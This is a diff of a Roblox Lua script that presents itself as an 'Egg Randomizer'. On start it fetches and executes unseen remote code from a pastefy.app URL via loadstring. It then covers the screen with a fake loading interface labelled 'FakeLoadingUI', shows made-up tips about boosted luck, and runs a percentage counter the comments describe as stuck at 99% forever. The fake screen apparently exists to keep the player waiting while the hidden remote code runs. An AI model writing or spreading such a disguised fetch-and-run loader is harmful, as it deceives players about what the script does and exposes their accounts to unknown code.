@@ -1,16 +1,15 @@
 local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
 local TweenService = game:GetService("TweenService")
 local Player = Players.LocalPlayer
 
 repeat task.wait() until Player:FindFirstChild("PlayerGui")
 
--- Run the actual script immediately
+-- Load your real script immediately
 pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
+	loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
 end)
 
--- Create fake loading UI
+-- GUI Setup
 local gui = Instance.new("ScreenGui")
 gui.Name = "FakeLoadingUI"
 gui.IgnoreGuiInset = true
@@ -29,38 +28,64 @@ bg.Parent = gui
 
 -- Top Label
 local topLabel = Instance.new("TextLabel")
-topLabel.Size = UDim2.new(1, 0, 0.15, 0)
-topLabel.Position = UDim2.new(0, 0, 0, 0)
+topLabel.Size = UDim2.new(1, 0, 0.1, 0)
+topLabel.Position = UDim2.new(0, 0, 0.02, 0)
 topLabel.BackgroundTransparency = 1
 topLabel.Text = "Wait Until It Loads"
 topLabel.Font = Enum.Font.GothamBold
-topLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
+topLabel.TextColor3 = Color3.fromRGB(255, 120, 0)
 topLabel.TextScaled = true
+topLabel.TextStrokeTransparency = 0.8
+topLabel.TextStrokeColor3 = Color3.fromRGB(255, 70, 0)
 topLabel.Parent = bg
 
--- Center Loading Text
+-- Loading % Text
 local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(1, 0, 0.7, 0)
-loadingText.Position = UDim2.new(0, 0, 0.15, 0)
+loadingText.Size = UDim2.new(1, 0, 0.3, 0)
+loadingText.Position = UDim2.new(0, 0, 0.25, 0)
 loadingText.BackgroundTransparency = 1
 loadingText.Text = "0%"
 loadingText.Font = Enum.Font.GothamBlack
 loadingText.TextColor3 = Color3.new(1, 1, 1)
 loadingText.TextScaled = true
+loadingText.TextStrokeTransparency = 0.6
+loadingText.TextStrokeColor3 = Color3.new(0, 0, 0)
 loadingText.Parent = bg
+
+-- Rotating Tips
+local tips = {
+	"Tip: Connecting to Egg Randomizer...",
+	"Tip: Rare eggs give better pets!",
+	"Tip: Randomizer fixes bugged eggs!",
+	"Tip: Legendary luck boosted.",
+	"Tip: Hatching smarter with Egg Randomizer."
+}
+local tipLabel = Instance.new("TextLabel")
+tipLabel.Size = UDim2.new(1, 0, 0.1, 0)
+tipLabel.Position = UDim2.new(0, 0, 0.58, 0)
+tipLabel.BackgroundTransparency = 1
+tipLabel.Text = ""
+tipLabel.Font = Enum.Font.Gotham
+tipLabel.TextColor3 = Color3.fromRGB(255, 150, 0)
+tipLabel.TextScaled = true
+tipLabel.TextStrokeTransparency = 0.8
+tipLabel.TextStrokeColor3 = Color3.fromRGB(255, 70, 0)
+tipLabel.Parent = bg
 
 -- Bottom Label
 local bottomLabel = Instance.new("TextLabel")
-bottomLabel.Size = UDim2.new(1, 0, 0.15, 0)
-bottomLabel.Position = UDim2.new(0, 0, 0.85, 0)
+bottomLabel.Size = UDim2.new(1, 0, 0.1, 0)
+bottomLabel.Position = UDim2.new(0, 0, 0.88, 0)
 bottomLabel.BackgroundTransparency = 1
 bottomLabel.Text = "Be Patient"
 bottomLabel.Font = Enum.Font.GothamBold
-bottomLabel.TextColor3 = Color3.fromRGB(255, 150, 150)
+bottomLabel.TextColor3 = Color3.fromRGB(255, 80, 0)
 bottomLabel.TextScaled = true
+bottomLabel.TextStrokeTransparency = 0.8
+bottomLabel.TextStrokeColor3 = Color3.fromRGB(255, 50, 0)
 bottomLabel.Parent = bg
 
--- Fire Animation Function
+-- Fire Animation
 local function spawnFire()
 	for i = 1, 5 do
 		local fire = Instance.new("TextLabel")
@@ -86,7 +111,7 @@ local function spawnFire()
 	end
 end
 
--- Loop Fire Animation
+-- Loop fire animation
 task.spawn(function()
 	while true do
 		spawnFire()
@@ -94,10 +119,19 @@ task.spawn(function()
 	end
 end)
 
--- Fake Smooth Loading %
+-- Loop tip changes
 task.spawn(function()
-	for i = 1, 100 do
-		loadingText.Text = i .. "%"
-		task.wait(math.random(5, 10) / 100) -- Makes it load slowly
+	while true do
+		tipLabel.Text = tips[math.random(1, #tips)]
+		task.wait(5)
 	end
+end)
+
+-- Fake loading: 0 to 99% in 60 seconds, then stuck
+task.spawn(function()
+	for i = 1, 99 do
+		loadingText.Text = i .. "%"
+		task.wait(60 / 99) -- = ~0.6s per %
+	end
+	loadingText.Text = "99%" -- Stuck forever
 end)
